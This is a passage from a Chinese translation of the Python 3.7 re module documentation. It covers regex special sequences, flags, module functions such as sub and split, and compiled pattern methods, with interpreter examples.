字符集合内，任何数字转义都被看作是字符。</p>\n\n<p><code>\\A</code></p>\n\n<p>只匹配字符串开始。</p>\n\n<p><code>\\b</code></p>\n\n<p>匹配空字符串，但只在单词开始或结尾的位置。一个单词被定义为一个单词字符的序列。注意，通常 <code>\\b</code> 定义为 <code>\\w</code> 和 <code>\\W</code> 字符之间，或者 <code>\\w</code> 和字符串开始/结尾的边界， 意思就是 <code>r'\\bfoo\\b'</code> 匹配 <code>'foo'</code>, <code>'foo.'</code>, <code>'(foo)'</code>, <code>'bar foo baz'</code> 但不匹配 <code>'foobar'</code> 或者 <code>'foo3'</code>。</p>\n\n<p>默认情况下，Unicode字母和数字是在Unicode样式中使用的，但是可以用 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.ASCII\" rel=\"nofollow\"><code>ASCII</code></a> 标记来更改。如果 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.LOCALE\" rel=\"nofollow\"><code>LOCALE</code></a> 标记被设置的话，词的边界是由当前语言区域设置决定的，<code>\\b</code> 表示退格字符，以便与Python字符串文本兼容。</p>\n\n<p><code>\\B</code></p>\n\n<p>匹配空字符串，但 <em>不</em> 能在词的开头或者结尾。意思就是 <code>r'py\\B'</code> 匹配 <code>'python'</code>, <code>'py3'</code>, <code>'py2'</code>, 但不匹配 <code>'py'</code>, <code>'py.'</code>, 或者 <code>'py!'</code>. <code>\\B</code> 是 <code>\\b</code> 的取非，所以Unicode样式的词语是由Unicode字母，数字或下划线构成的，虽然可以用 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.ASCII\" rel=\"nofollow\"><code>ASCII</code></a> 标志来改变。如果使用了 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.LOCALE\" rel=\"nofollow\"><code>LOCALE</code></a> 标志，则词的边界由当前语言区域设置。</p>\n\n<p><code>\\d</code></p>\n\n<p>对于 Unicode (str) 样式：</p>\n\n<p>匹配任何Unicode十进制数（就是在Unicode字符目录[Nd]里的字符）。这包括了 <code>[0-9]</code> ，和很多其他的数字字符。如果设置了 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.ASCII\" rel=\"nofollow\"><code>ASCII</code></a> 标志，就只匹配 <code>[0-9]</code> 。</p>\n\n<p>对于8位(bytes)样式：</p>\n\n<p>匹配任何十进制数，就是 <code>[0-9]</code>。</p>\n\n<p><code>\\D</code></p>\n\n<p>匹配任何非十进制数字的字符。就是 <code>\\d</code> 取非。 如果设置了 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.ASCII\" rel=\"nofollow\"><code>ASCII</code></a> 标志，就相当于 <code>[^0-9]</code> 。</p>\n\n<p><code>\\s</code></p>\n\n<p>对于 Unicode (str) 样式：</p>\n\n<p>匹配任何Unicode空白字符（包括 <code>[ \\t\\n\\r\\f\\v]</code> ，还有很多其他字符，比如不同语言排版规则约定的不换行空格）。如果 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.ASCII\" rel=\"nofollow\"><code>ASCII</code></a> 被设置，就只匹配 <code>[ \\t\\n\\r\\f\\v]</code> 。</p>\n\n<p>对于8位(bytes)样式：</p>\n\n<p>匹配ASCII中的空白字符，就是 <code>[ \\t\\n\\r\\f\\v]</code> 。</p>\n\n<p><code>\\S</code></p>\n\n<p>匹配任何非空白字符。就是 <code>\\s</code> 取非。如果设置了 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.ASCII\" rel=\"nofollow\"><code>ASCII</code></a> 标志，就相当于 <code>[^ \\t\\n\\r\\f\\v]</code> 。</p>\n\n<p><code>\\w</code></p>\n\n<p>对于 Unicode (str) 样式：</p>\n\n<p>匹配Unicode词语的字符，包含了可以构成词语的绝大部分字符，也包括数字和下划线。如果设置了 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.ASCII\" rel=\"nofollow\"><code>ASCII</code></a> 标志，就只匹配 <code>[a-zA-Z0-9_]</code> 。</p>\n\n<p>对于8位(bytes)样式：</p>\n\n<p>匹配ASCII字符中的数字和字母和下划线，就是 <code>[a-zA-Z0-9_]</code> 。如果设置了 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.LOCALE\" rel=\"nofollow\"><code>LOCALE</code></a> 标记，就匹配当前语言区域的数字和字母和下划线。</p>\n\n<p><code>\\W</code></p>\n\n<p>匹配任何非词语字符。是 <code>\\w</code> 取非。如果设置了 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.ASCII\" rel=\"nofollow\"><code>ASCII</code></a> 标记，就相当于 <code>[^a-zA-Z0-9_]</code> 。如果设置了 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.LOCALE\" rel=\"nofollow\"><code>LOCALE</code></a>标志，就匹配当前语言区域的 <em>非</em> 词语字符。</p>\n\n<p><code>\\Z</code></p>\n\n<p>只匹配字符串尾。</p>\n\n<p id=\"index-35\">绝大部分Python的标准转义字符也被正则表达式分析器支持。:</p>\n\n<pre>\n\\a      \\b      \\f      \\n\n\\r      \\t      \\u      \\U\n\\v      \\x      \\\\\n</pre>\n\n<p>（注意 <code>\\b</code> 被用于表示词语的边界，它只在字符集合内表示退格，比如 <code>[\\b]</code> 。）</p>\n\n<p><code>'\\u'</code> 和 <code>'\\U'</code> 转义序列只在 Unicode 样式中支持。 在 bytes 算啊看会显示错误。 未知的 ASCII 字符转义序列保留在未来使用，会被当作错误来处理。</p>\n\n<p>八进制转义包含为一个有限形式。如果首位数字是 0， 或者有三个八进制数位，那么就认为它是八进制转义。其他的情况，就看作是组引用。对于字符串文本，八进制转义最多有三个数位长。</p>\n\n<p>在 3.3 版更改: 增加了 <code>'\\u'</code> 和 <code>'\\U'</code> 转义序列。</p>\n\n<p>在 3.6 版更改: 由 <code>'\\'</code> 和一个ASCII字符组成的未知转义会被看成错误。</p>\n\n<h2>模块内容</h2>\n\n<p>模块定义了几个函数，常量，和一个例外。有些函数是编译后的正则表达式方法的简化版本（少了一些特性）。绝大部分重要的应用，总是会先将正则表达式编译，之后在进行操作。</p>\n\n<p>在 3.6 版更改: 标志常量现在是 <code>RegexFlag</code> 类的实例，这个类是 <a href=\"https://docs.python.org/zh-cn/3.7/library/enum.html#enum.IntFlag\" rel=\"nofollow\"><code>enum.IntFlag</code></a> 的子类。</p>\n\n<p><code>re.</code><code>compile</code>(<em>pattern</em>, <em>flags=0</em>)</p>\n\n<p>将正则表达式的样式编译为一个 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re-objects\" rel=\"nofollow\">正则表达式对象</a> （正则对象），可以用于匹配，通过这个对象的方法<a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.Pattern.match\" rel=\"nofollow\"><code>match()</code></a>, <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.Pattern.search\" rel=\"nofollow\"><code>search()</code></a> 以及其他如下描述。</p>\n\n<p>这个表达式的行为可以通过指定 <em>标记</em> 的值来改变。值可以是以下任意变量，可以通过位的OR操作来结合（ <code>|</code>操作符）。</p>\n\n<p>序列</p>\n\n<pre>\nprog = re.compile(pattern)\nresult = prog.match(string)\n</pre>\n\n<p>等价于</p>\n\n<pre>\nresult = re.match(pattern, string)\n</pre>\n\n<p>如果需要多次使用这个正则表达式的话，使用 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.compile\" rel=\"nofollow\"><code>re.compile()</code></a> 和保存这个正则对象以便复用，可以让程序更加高效。</p>\n\n<p>注解</p>\n\n<p> </p>\n\n<p>通过 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.compile\" rel=\"nofollow\"><code>re.compile()</code></a> 编译后的样式，和模块级的函数会被缓存， 所以少数的正则表达式使用无需考虑编译的问题。</p>\n\n<p><code>re.</code><code>A</code></p>\n\n<p><code>re.</code><code>ASCII</code></p>\n\n<p>让 <code>\\w</code>, <code>\\W</code>, <code>\\b</code>, <code>\\B</code>, <code>\\d</code>, <code>\\D</code>, <code>\\s</code> 和 <code>\\S</code> 只匹配ASCII，而不是Unicode。这只对Unicode样式有效，会被byte样式忽略。相当于前面语法中的内联标志 <code>(?a)</code> 。</p>\n\n<p>注意，为了保持向后兼容， <code>re.U</code> 标记依然存在（还有他的同义 <code>re.UNICODE</code> 和嵌入形式 <code>(?u)</code> ) ， 但是这些在 Python 3 是冗余的，因为默认字符串已经是Unicode了（并且Unicode匹配不允许byte出现)。</p>\n\n<p><code>re.</code><code>DEBUG</code></p>\n\n<p>显示编译时的debug信息，没有内联标记。</p>\n\n<p><code>re.</code><code>I</code></p>\n\n<p><code>re.</code><code>IGNORECASE</code></p>\n\n<p>进行忽略大小写匹配；表达式如 <code>[A-Z]</code> 也会匹配小写字符。Unicode匹配（比如 <code>Ü</code> 匹配 <code>ü</code>）同样有用，除非设置了 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.ASCII\" rel=\"nofollow\"><code>re.ASCII</code></a> 标记来禁用非ASCII匹配。当前语言区域不会改变这个标记，除非设置了 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.LOCALE\" rel=\"nofollow\"><code>re.LOCALE</code></a> 标记。这个相当于内联标记 <code>(?i)</code> 。</p>\n\n<p>注意，当设置了 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.IGNORECASE\" rel=\"nofollow\"><code>IGNORECASE</code></a> 标记，搜索Unicode样式 <code>[a-z]</code> 或 <code>[A-Z]</code> 的结合时，它将会匹配52个ASCII字符和4个额外的非ASCII字符： 'İ' (U+0130, 拉丁大写的 I 带个点在上面), 'ı' (U+0131, 拉丁小写没有点的 I ), 'ſ' (U+017F, 拉丁小写长 s) and 'K' (U+212A, 开尔文符号).如果使用 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.ASCII\" rel=\"nofollow\"><code>ASCII</code></a> 标记，就只匹配 'a' 到 'z' 和 'A' 到 'Z' 。</p>\n\n<p><code>re.</code><code>L</code></p>\n\n<p><code>re.</code><code>LOCALE</code></p>\n\n<p>由当前语言区域决定 <code>\\w</code>, <code>\\W</code>, <code>\\b</code>, <code>\\B</code> 和大小写敏感匹配。这个标记只能对byte样式有效。这个标记不推荐使用，因为语言区域机制很不可靠，它一次只能处理一个 \"习惯”，而且只对8位字节有效。Unicode匹配在Python 3 里默认启用，并可以处理不同语言。 这个对应内联标记 <code>(?L)</code> 。</p>\n\n<p>在 3.6 版更改: <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.LOCALE\" rel=\"nofollow\"><code>re.LOCALE</code></a> 只能用于byte样式，而且不能和 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.ASCII\" rel=\"nofollow\"><code>re.ASCII</code></a> 一起用。</p>\n\n<p>在 3.7 版更改: 设置了 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.LOCALE\" rel=\"nofollow\"><code>re.LOCALE</code></a> 标记的编译正则对象不再在编译时依赖语言区域设置。语言区域设置只在匹配的时候影响其结果。</p>\n\n<p><code>re.</code><code>M</code></p>\n\n<p><code>re.</code><code>MULTILINE</code></p>\n\n<p>设置以后，样式字符 <code>'^'</code> 匹配字符串的开始，和每一行的开始（换行符后面紧跟的符号）；样式字符 <code>'$'</code> 匹配字符串尾，和每一行的结尾（换行符前面那个符号）。默认情况下，<code>’^’</code> 匹配字符串头，<code>'$'</code> 匹配字符串尾。对应内联标记 <code>(?m)</code> 。</p>\n\n<p><code>re.</code><code>S</code></p>\n\n<p><code>re.</code><code>DOTALL</code></p>\n\n<p>让 <code>'.'</code> 特殊字符匹配任何字符，包括换行符；如果没有这个标记，<code>'.'</code> 就匹配 <em>除了</em> 换行符的其他任意字符。对应内联标记 <code>(?s)</code> 。</p>\n\n<p><code>re.</code><code>X</code></p>\n\n<p><code>re.</code><code>VERBOSE</code></p>\n\n<p id=\"index-36\">这个标记允许你编写更具可读性更友好的正则表达式。通过分段和添加注释。空白符号会被忽略，除非在一个字符集合当中或者由反斜杠转义，或者在 <code>*?</code>, <code>(?:</code> or <code>(?P&lt;…&gt;</code> 分组之内。当一个行内有 <code>#</code> 不在字符集和转义序列，那么它之后的所有字符都是注释。</p>\n\n<p>意思就是下面两个正则表达式等价地匹配一个十进制数字：</p>\n\n<pre>\na = re.compile(r\"\"\"\\d +  # the integral part\n                   \\.    # the decimal point\n                   \\d *  # some fractional digits\"\"\", re.X)\nb = re.compile(r\"\\d+\\.\\d*\")\n</pre>\n\n<p>对应内联标记 <code>(?x)</code> 。</p>\n\n<p><code>re.</code><code>search</code>(<em>pattern</em>, <em>string</em>, <em>flags=0</em>)</p>\n\n<p>扫描整个 <em>字符串</em> 找到匹配样式的第一个位置，并返回一个相应的 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#match-objects\" rel=\"nofollow\">匹配对象</a>。如果没有匹配，就返回一个 <code>None</code>； 注意这和找到一个零长度匹配是不同的。</p>\n\n<p><code>re.</code><code>match</code>(<em>pattern</em>, <em>string</em>, <em>flags=0</em>)</p>\n\n<p>如果 <em>string</em> 开始的0或者多个字符匹配到了正则表达式样式，就返回一个相应的 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#match-objects\" rel=\"nofollow\">匹配对象</a> 。 如果没有匹配，就返回 <code>None</code> ；注意它跟零长度匹配是不同的。</p>\n\n<p>注意即便是 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.MULTILINE\" rel=\"nofollow\"><code>MULTILINE</code></a> 多行模式， <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.match\" rel=\"nofollow\"><code>re.match()</code></a> 也只匹配字符串的开始位置，而不匹配每行开始。</p>\n\n<p>如果你想定位 <em>string</em> 的任何位置，使用 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.search\" rel=\"nofollow\"><code>search()</code></a> 来替代（也可参考 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#search-vs-match\" rel=\"nofollow\">search() vs. match()</a> ）</p>\n\n<p><code>re.</code><code>fullmatch</code>(<em>pattern</em>, <em>string</em>, <em>flags=0</em>)</p>\n\n<p>如果整个 <em>string</em> 匹配到正则表达式样式，就返回一个相应的 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#match-objects\" rel=\"nofollow\">匹配对象</a> 。 否则就返回一个 <code>None</code> ；注意这跟零长度匹配是不同的。</p>\n\n<p>3.4 新版功能.</p>\n\n<p><code>re.</code><code>split</code>(<em>pattern</em>, <em>string</em>, <em>maxsplit=0</em>, <em>flags=0</em>)</p>\n\n<p>用 <em>pattern</em> 分开 <em>string</em> 。 如果在 <em>pattern</em> 中捕获到括号，那么所有的组里的文字也会包含在列表里。如果 <em>maxsplit</em> 非零， 最多进行 <em>maxsplit</em> 次分隔， 剩下的字符全部返回到列表的最后一个元素。</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; re.split(r'\\W+', 'Words, words, words.')\n['Words', 'words', 'words', '']\n&gt;&gt;&gt; re.split(r'(\\W+)', 'Words, words, words.')\n['Words', ', ', 'words', ', ', 'words', '.', '']\n&gt;&gt;&gt; re.split(r'\\W+', 'Words, words, words.', 1)\n['Words', 'words, words.']\n&gt;&gt;&gt; re.split('[a-f]+', '0a3B9', flags=re.IGNORECASE)\n['0', '3', '9']\n</pre>\n\n<p>如果分隔符里有捕获组合，并且匹配到字符串的开始，那么结果将会以一个空字符串开始。对于结尾也是一样</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; re.split(r'(\\W+)', '...words, words...')\n['', '...', 'words', ', ', 'words', '...', '']\n</pre>\n\n<p>这样的话，分隔组将会出现在结果列表中同样的位置。</p>\n\n<p>样式的空匹配将分开字符串，但只在不相临的状况生效。</p>\n\n<pre>\n&gt;&gt;&gt; re.split(r'\\b', 'Words, words, words.')\n['', 'Words', ', ', 'words', ', ', 'words', '.']\n&gt;&gt;&gt; re.split(r'\\W*', '...words...')\n['', '', 'w', 'o', 'r', 'd', 's', '', '']\n&gt;&gt;&gt; re.split(r'(\\W*)', '...words...')\n['', '...', '', '', 'w', '', 'o', '', 'r', '', 'd', '', 's', '...', '', '', '']\n</pre>\n\n<p>在 3.1 版更改: 增加了可选标记参数。</p>\n\n<p>在 3.7 版更改: 增加了空字符串的样式分隔。</p>\n\n<p><code>re.</code><code>findall</code>(<em>pattern</em>, <em>string</em>, <em>flags=0</em>)</p>\n\n<p>对 <em>string</em> 返回一个不重复的 <em>pattern</em> 的匹配列表， <em>string</em> 从左到右进行扫描，匹配按找到的顺序返回。如果样式里存在一到多个组，就返回一个组合列表；就是一个元组的列表（如果样式里有超过一个组合的话）。空匹配也会包含在结果里。</p>\n\n<p>在 3.7 版更改: 非空匹配现在可以在前一个空匹配之后出现了。</p>\n\n<p><code>re.</code><code>finditer</code>(<em>pattern</em>, <em>string</em>, <em>flags=0</em>)</p>\n\n<p><em>pattern</em> 在 <em>string</em> 里所有的非重复匹配，返回为一个迭代器 <a href=\"https://docs.python.org/zh-cn/3.7/glossary.html#term-iterator\" rel=\"nofollow\">iterator</a> 保存了 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#match-objects\" rel=\"nofollow\">匹配对象</a> 。 <em>string</em> 从左到右扫描，匹配按顺序排列。空匹配也包含在结果里。</p>\n\n<p>在 3.7 版更改: 非空匹配现在可以在前一个空匹配之后出现了。</p>\n\n<p><code>re.</code><code>sub</code>(<em>pattern</em>, <em>repl</em>, <em>string</em>, <em>count=0</em>, <em>flags=0</em>)</p>\n\n<p>返回通过使用 <em>repl</em> 替换在 <em>string</em> 最左边非重叠出现的 <em>pattern</em> 而获得的字符串。 如果样式没有找到，则不加改变地返回 <em>string</em>。 <em>repl</em> 可以是字符串或函数；如为字符串，则其中任何反斜杠转义序列都会被处理。 也就是说，<code>\\n</code> 会被转换为一个换行符，<code>\\r</code> 会被转换为一个回车附，依此类推。 未知的 ASCII 字符转义序列保留在未来使用，会被当作错误来处理。 其他未知转义序列例如 <code>\\&amp;</code> 会保持原样。 向后引用像是 <code>\\6</code> 会用样式中第 6 组所匹配到的子字符串来替换。 例如:</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; re.sub(r'def\\s+([a-zA-Z_][a-zA-Z_0-9]*)\\s*\\(\\s*\\):',\n...        r'static PyObject*\\npy_\\1(void)\\n{',\n...        'def myfunc():')\n'static PyObject*\\npy_myfunc(void)\\n{'\n</pre>\n\n<p>如果 <em>repl</em> 是一个函数，那它会对每个非重复的 <em>pattern</em> 的情况调用。这个函数只能有一个 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#match-objects\" rel=\"nofollow\">匹配对象</a> 参数，并返回一个替换后的字符串。比如</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; def dashrepl(matchobj):\n...     if matchobj.group(0) == '-': return ' '\n...     else: return '-'\n&gt;&gt;&gt; re.sub('-{1,2}', dashrepl, 'pro----gram-files')\n'pro--gram files'\n&gt;&gt;&gt; re.sub(r'\\sAND\\s', ' &amp; ', 'Baked Beans And Spam', flags=re.IGNORECASE)\n'Baked Beans &amp; Spam'\n</pre>\n\n<p>样式可以是一个字符串或者一个 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re-objects\" rel=\"nofollow\">样式对象</a> 。</p>\n\n<p>可选参数 <em>count</em> 是要替换的最大次数；<em>count</em> 必须是非负整数。如果忽略这个参数，或者设置为0，所有的匹配都会被替换。空匹配只在不相临连续的情况被更替，所以 <code>sub('x*', '-', 'abxd')</code> 返回 <code>'-a-b--d-'</code> 。</p>\n\n<p id=\"index-37\">在字符串类型的 <em>repl</em> 参数里，如上所述的转义和向后引用中，<code>\\g&lt;name&gt;</code> 会使用命名组合 <code>name</code>，（在 <code>(?P&lt;name&gt;…)</code> 语法中定义） <code>\\g&lt;number&gt;</code> 会使用数字组；<code>\\g&lt;2&gt;</code> 就是 <code>\\2</code>，但它避免了二义性，如 <code>\\g&lt;2&gt;0</code>。 <code>\\20</code>就会被解释为组20，而不是组2后面跟随一个字符 <code>'0'</code>。向后引用 <code>\\g&lt;0&gt;</code> 把 <em>pattern</em> 作为一整个组进行引用。</p>\n\n<p>在 3.1 版更改: 增加了可选标记参数。</p>\n\n<p>在 3.5 版更改: 不匹配的组合替换为空字符串。</p>\n\n<p>在 3.6 版更改: <em>pattern</em> 中的未知转义（由 <code>'\\'</code> 和一个 ASCII 字符组成）被视为错误。</p>\n\n<p>在 3.7 版更改: <em>repl</em> 中的未知转义（由 <code>'\\'</code> 和一个 ASCII 字符组成）被视为错误。</p>\n\n<p>样式中的空匹配相邻接时会被替换。</p>\n\n<p><code>re.</code><code>subn</code>(<em>pattern</em>, <em>repl</em>, <em>string</em>, <em>count=0</em>, <em>flags=0</em>)</p>\n\n<p>行为与 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.sub\" rel=\"nofollow\"><code>sub()</code></a> 相同，但是返回一个元组 <code>(字符串, 替换次数)</code>.</p>\n\n<p>在 3.1 版更改: 增加了可选标记参数。</p>\n\n<p>在 3.5 版更改: 不匹配的组合替换为空字符串。</p>\n\n<p><code>re.</code><code>escape</code>(<em>pattern</em>)</p>\n\n<p>转义 <em>pattern</em> 中的特殊字符。如果你想对任意可能包含正则表达式元字符的文本字符串进行匹配，它就是有用的。比如</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; print(re.escape('python.exe'))\npython\\.exe\n\n&gt;&gt;&gt; legal_chars = string.ascii_lowercase + string.digits + \"!#$%&amp;'*+-.^_`|~:\"\n&gt;&gt;&gt; print('[%s]+' % re.escape(legal_chars))\n[abcdefghijklmnopqrstuvwxyz0123456789!\\#\\$%\\&amp;'\\*\\+\\-\\.\\^_`\\|\\~:]+\n\n&gt;&gt;&gt; operators = ['+', '-', '*', '/', '**']\n&gt;&gt;&gt; print('|'.join(map(re.escape, sorted(operators, reverse=True))))\n/|\\-|\\+|\\*\\*|\\*\n</pre>\n\n<p>这个函数不能用在 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.sub\" rel=\"nofollow\"><code>sub()</code></a> 和 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.subn\" rel=\"nofollow\"><code>subn()</code></a> 的替换字符串里，只有反斜杠应该被转义，比如说</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; digits_re = r'\\d+'\n&gt;&gt;&gt; sample = '/usr/sbin/sendmail - 0 errors, 12 warnings'\n&gt;&gt;&gt; print(re.sub(digits_re, digits_re.replace('\\\\', r'\\\\'), sample))\n/usr/sbin/sendmail - \\d+ errors, \\d+ warnings\n</pre>\n\n<p>在 3.3 版更改: <code>'_'</code> 不再被转义。</p>\n\n<p>在 3.7 版更改: 只有在正则表达式中可以产生特殊含义的字符会被转义。</p>\n\n<p><code>re.</code><code>purge</code>()</p>\n\n<p>清除正则表达式缓存。</p>\n\n<p><em>exception </em><code>re.</code><code>error</code>(<em>msg</em>, <em>pattern=None</em>, <em>pos=None</em>)</p>\n\n<p><code>raise</code> 一个例外。当传递到函数的字符串不是一个有效正则表达式的时候（比如，包含一个不匹配的括号）或者其他错误在编译时或匹配时产生。如果字符串不包含样式匹配，是不会被视为错误的。错误实例有以下附加属性：</p>\n\n<p><code>msg</code></p>\n\n<p>未格式化的错误消息。</p>\n\n<p><code>pattern</code></p>\n\n<p>正则表达式样式。</p>\n\n<p><code>pos</code></p>\n\n<p>编译失败的 <em>pattern</em> 的位置索引（可以是 <code>None</code> ）。</p>\n\n<p><code>lineno</code></p>\n\n<p>对应 <em>pos</em> (可以是 <code>None</code>) 的行号。</p>\n\n<p><code>colno</code></p>\n\n<p>对应 <em>pos</em> (可以是 <code>None</code>) 的列号。</p>\n\n<p>在 3.5 版更改: 添加了附加属性。</p>\n\n<h2>正则表达式对象 （正则对象）</h2>\n\n<p>编译后的正则表达式对象支持一下方法和属性：</p>\n\n<p><code>Pattern.</code><code>search</code>(<em>string</em>[, <em>pos</em>[, <em>endpos</em>]])</p>\n\n<p>扫描整个 <em>string</em> 寻找第一个匹配的位置， 并返回一个相应的 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#match-objects\" rel=\"nofollow\">匹配对象</a>。如果没有匹配，就返回 <code>None</code> ；注意它和零长度匹配是不同的。</p>\n\n<p>可选的第二个参数 <em>pos</em> 给出了字符串中开始搜索的位置索引；默认为 <code>0</code>，它不完全等价于字符串切片； <code>'^'</code> 样式字符匹配字符串真正的开头，和换行符后面的第一个字符，但不会匹配索引规定开始的位置。</p>\n\n<p>可选参数 <em>endpos</em> 限定了字符串搜索的结束；它假定字符串长度到 <em>endpos</em> ， 所以只有从 <code>pos</code> 到 <code>endpos - 1</code>的字符会被匹配。如果 <em>endpos</em> 小于 <em>pos</em>，就不会有匹配产生；另外，如果 <em>rx</em> 是一个编译后的正则对象， <code>rx.search(string, 0, 50)</code> 等价于 <code>rx.search(string[:50], 0)</code>。</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; pattern = re.compile(\"d\")\n&gt;&gt;&gt; pattern.search(\"dog\")     # Match at index 0\n&lt;re.Match object; span=(0, 1), match='d'&gt;\n&gt;&gt;&gt; pattern.search(\"dog\", 1)  # No match; search doesn't include the \"d\"\n</pre>\n\n<p><code>Pattern.</code><code>match</code>(<em>string</em>[, <em>pos</em>[, <em>endpos</em>]])</p>\n\n<p>如果 <em>string</em> 的 <em>开始位置</em> 能够找到这个正则样式的任意个匹配，就返回一个相应的 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#match-objects\" rel=\"nofollow\">匹配对象</a>。如果不匹配，就返回 <code>None</code> ；注意它与零长度匹配是不同的。</p>\n\n<p>可选参数 <em>pos</em> 和 <em>endpos</em> 与 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.Pattern.search\" rel=\"nofollow\"><code>search()</code></a> 含义相同。</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; pattern = re.compile(\"o\")\n&gt;&gt;&gt; pattern.match(\"dog\")      # No match as \"o\" is not at the start of \"dog\".\n&gt;&gt;&gt; pattern.match(\"dog\", 1)   # Match as \"o\" is the 2nd character of \"dog\".\n&lt;re.Match object; span=(1, 2), match='o'&gt;\n</pre>\n\n<p>如果你想定位匹配在 <em>string</em> 中的位置，使用 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.Pattern.search\" rel=\"nofollow\"><code>search()</code></a> 来替代（另参考 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#search-vs-match\" rel=\"nofollow\">search() vs. match()</a>）。</p>\n\n<p><code>Pattern.</code><code>fullmatch</code>(<em>string</em>[, <em>pos</em>[, <em>endpos</em>]])</p>\n\n<p>如果整个 <em>string</em> 匹配这个正则表达式，就返回一个相应的 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#match-objects\" rel=\"nofollow\">匹配对象</a> 。 否则就返回 <code>None</code> ； 注意跟零长度匹配是不同的。</p>\n\n<p>可选参数 <em>pos</em> 和 <em>endpos</em> 与 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.Pattern.search\" rel=\"nofollow\"><code>search()</code></a> 含义相同。</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; pattern = re.compile(\"o[gh]\")\n&gt;&gt;&gt; pattern.fullmatch(\"dog\")      # No match as \"o\" is not at the start of \"dog\".\n&gt;&gt;&gt; pattern.fullmatch(\"ogre\")     # No match as not the full string matches.\n&gt;&gt;&gt; pattern.fullmatch(\"doggie\", 1, 3)   # Matches within given limits.\n&lt;re.Match object; span=(1, 3), match='og'&gt;\n</pre>\n\n<p>3.4 新版功能.</p>\n\n<p><code>Pattern.</code><code>split</code>(<em>string</em>, <em>maxsplit=0</em>)</p>\n\n<p>等价于 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.split\" rel=\"nofollow\"><code>split()</code></a> 函数，使用了编译后的样式。</p>\n\n<p><code>Pattern.</code><code>findall</code>(<em>string</em>[, <em>pos</em>[, <em>endpos</em>]])</p>\n\n<p>类似函数 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.findall\" rel=\"nofollow\"><code>findall()</code></a> ， 使用了编译后样式，但也可以接收可选参数 <em>pos</em> 和 <em>endpos</em> ，限制搜索范围，就像 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.search\" rel=\"nofollow\"><code>search()</code></a>。</p>\n\n<p><code>Pattern.</code><code>finditer</code>(<em>string</em>[, <em>pos</em>[, <em>endpos</em>]])</p>\n\n<p>类似函数 <code>finiter()</code> ， 使用了编译后样式，但也可以接收可选参数 <em>pos</em> 和 <em>endpos</em> ，限制搜索范围，就像 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.search\" rel=\"nofollow\"><code>search()</code></a>。</p>\n\n<p><code>Pattern.</code><code>sub</code>(<em>repl</em>, <em>string</em>, <em>count=0</em>)</p>\n\n<p>等价于 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.sub\" rel=\"nofollow\"><code>sub()</code></a> 函数，使用了编译后的样式。</p>\n\n<p><code>Pattern.</code><code>subn</code>(<em>repl</em>, <em>string</em>, <em>count=0</em>)</p>\n\n<p>等价于 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.subn\" rel=\"nofollow\"><code>subn()</code></a> 函数，使用了编译后的样式。</p>\n\n<p><code>Pattern.</code><code>flags</code></p>\n\n<p>正则匹配标记。这是可以传递给 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.compile\" rel=\"nofollow\"><code>compile()</code></a> 的参数，任何 